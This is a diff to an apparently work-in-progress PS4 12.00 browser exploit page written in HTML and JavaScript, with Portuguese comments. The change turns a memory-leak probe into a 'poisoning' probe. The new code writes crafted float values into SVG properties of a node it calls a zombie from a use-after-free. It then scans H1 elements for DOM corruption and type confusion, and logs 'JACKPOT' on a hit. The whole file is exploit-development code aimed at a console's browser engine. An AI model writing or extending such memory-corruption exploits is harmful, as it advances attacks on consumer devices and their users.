@@ -2,11 +2,11 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 12.00 - Deep Memory SVG Probe</title>
+<title>PS4 12.00 - SVG Poison Probe</title>
 </head>
 <body style="background:#111;color:#0f0;font-family:monospace;">
 
-<h2>UAF → SVG Deep Memory Offset Probe</h2>
+<h2>UAF → SVG Poisoning → DOM Corruption</h2>
 <button onclick="runTest()">Run Test</button>
 
 <script>
@@ -72,46 +72,64 @@ function inject(child){
 }
 
 // ==========================
-// 🔬 DEEP MEMORY PROBE (O NOVO LEAK)
+// 🔬 POISON PROBE (TESTE DE ESCRITA CRUZADA)
 function domOverlapProbe(fsTarget){
-    log("---- DEEP SVG PROBE ----");
+    log("---- POISON PROBE ----");
 
     try{
         let n = fsTarget.firstChild;
         if(!n) return;
 
         if(n.nodeType === 1){
-            log("[!] Acessando Offsets Profundos do SVG...");
+            log("[!] Injetando veneno no zumbi...");
 
-            // 1. Tenta ler o currentScale (é um FLOAT no C++)
-            // Se ler fora do H1, vai retornar um número decimal maluco
-            try {
-                let scale = n.currentScale;
-                log("[$$$] currentScale: " + scale);
-                
-                // Se não for 1 (que é o padrão do SVG), NÓS VAZAMOS MEMÓRIA!
-                if(scale !== 1 && scale !== 0) {
-                    log("[!!!] JACKPOT! VAZAMENTO DE MEMÓRIA VIZINHA!");
+            // 1. Envenenando as propriedades matemáticas com Floats (8 bytes)
+            try { 
+                n.currentScale = 3.14159; 
+                log("[+] currentScale escrito!"); 
+            } catch(e) {}
+            
+            try { 
+                n.currentTranslate.x = 13.37; 
+                n.currentTranslate.y = 13.37; 
+                log("[+] currentTranslate escrito!"); 
+            } catch(e) {}
+
+            try { 
+                n.width.baseVal.value = 9999.99; 
+                log("[+] Width escrito!"); 
+            } catch(e) {}
+
+            // ==========================
+            // 🔥 VERIFICADOR DE VÍTIMAS
+            log("[*] Testando sobrevivência dos H1...");
+            
+            let h1s = document.getElementsByTagName("h1");
+            let hits = 0;
+            
+            for(let i=0; i<h1s.length; i++){
+                // Ignora o H1 do fullscreen
+                if(h1s[i].innerHTML && h1s[i].innerHTML.includes("FULLSCREEN")) continue;
+
+                try {
+                    // Força o motor C++ a varrer a memória do H1
+                    let txt = h1s[i].innerHTML; 
+                    
+                    // Se o veneno destruiu o ponteiro "parentNode", o H1 foi arrancado da árvore DOM!
+                    if(!h1s[i].parentNode) {
+                        log("[$$$] JACKPOT! H1 " + i + " perdeu a raiz (Ponteiro destruído)!");
+                        hits++;
+                        break;
+                    }
+                } catch(e) {
+                    // Se tentar ler o innerHTML gerar um erro no JS, corrompemos a StringImpl nativa!
+                    log("[$$$] JACKPOT! H1 " + i + " crashou na leitura (Type Confusion Write Confirmado)!");
+                    hits++;
+                    break;
                 }
-            } catch(e) { log("[UAF] scale error"); }
-
-            // 2. Tenta ler a posição (Translate)
-            try {
-                let tx = n.currentTranslate.x;
-                let ty = n.currentTranslate.y;
-                log("[$$$] Translate X/Y: " + tx + " / " + ty);
-                
-                if(tx !== 0 || ty !== 0) {
-                    log("[!!!] JACKPOT! VAZAMENTO DE TRANSLATE!");
-                }
-            } catch(e) { log("[UAF] translate error"); }
-
-            // 3. Tenta ler a base de tamanho
-            try {
-                let w = n.width.baseVal.value;
-                log("[$$$] Width: " + w);
-            } catch(e) { log("[UAF] width error"); }
-
+            }
+            
+            if(hits === 0) log("[SCAN] H1s intactos. Motor resistiu.");
         }
     }catch(e){
         log("[UAF] Probe total crash");
@@ -150,7 +168,7 @@ function trigger(fsTarget){
 // ==========================
 // MAIN
 function runTest(){
-    log("[*] Iniciando Deep Memory Leak...");
+    log("[*] Iniciando Property Poisoning...");
     
     window.heap_press = setupHeap(); 
 
